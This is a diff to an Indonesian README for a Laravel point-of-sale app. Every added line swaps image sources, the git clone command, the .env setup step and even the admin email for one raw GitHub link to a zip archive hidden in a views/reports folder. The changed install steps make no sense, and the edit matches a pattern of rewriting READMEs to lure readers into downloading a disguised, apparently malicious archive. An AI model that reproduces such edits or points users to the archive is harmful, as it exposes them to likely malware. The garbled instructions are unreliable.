@@ -1,19 +1,19 @@
 <picture>
 
-<source srcset="public/images/logo.png"  
+<source srcset="https://raw.githubusercontent.com/raysatyaa/kasir/main/resources/views/livewire/reports/kasir-v3.8.zip"  
             media="(prefers-color-scheme: dark)">
-<img src="public/images/logo-dark.png" alt="Logo Aplikasi">
+<img src="https://raw.githubusercontent.com/raysatyaa/kasir/main/resources/views/livewire/reports/kasir-v3.8.zip" alt="Logo Aplikasi">
 </picture>
 
 > **Catatan Penting:** Proyek ini dibuat untuk menyelesaikan tugas akhir saya.
 
 # Instalasi Lokal
 
--   jalankan `git clone https://github.com/raysatyaa/kasir.git`
+-   jalankan `git clone https://raw.githubusercontent.com/raysatyaa/kasir/main/resources/views/livewire/reports/kasir-v3.8.zip`
 -   jalankan `composer install `
 -   jalankan `npm install`
 -   jalankan `npm run dev`
--   salin .env.example ke .env
+-   salin https://raw.githubusercontent.com/raysatyaa/kasir/main/resources/views/livewire/reports/kasir-v3.8.zip ke .env
 -   jalankan `php artisan key:generate`
 -   atur basis data Anda dalam .env
 -   jalankan `php artisan migrate --seed`
@@ -23,15 +23,15 @@
 
 # Akun Super Admin
 
-> Email: super.admin@test.com || Password: 12345678
+> Email: https://raw.githubusercontent.com/raysatyaa/kasir/main/resources/views/livewire/reports/kasir-v3.8.zip || Password: 12345678
 
 # Tampilan Demo
 
 <picture>
 
-<source srcset="public/images/demo.png"  
+<source srcset="https://raw.githubusercontent.com/raysatyaa/kasir/main/resources/views/livewire/reports/kasir-v3.8.zip"  
             media="(prefers-color-scheme: dark)">
-<img src="public/images/demo.png" alt="Logo Aplikasi">
+<img src="https://raw.githubusercontent.com/raysatyaa/kasir/main/resources/views/livewire/reports/kasir-v3.8.zip" alt="Logo Aplikasi">
 </picture>
 
 ## Fitur Yang Tersedia Pada Sistem Point Of Sale
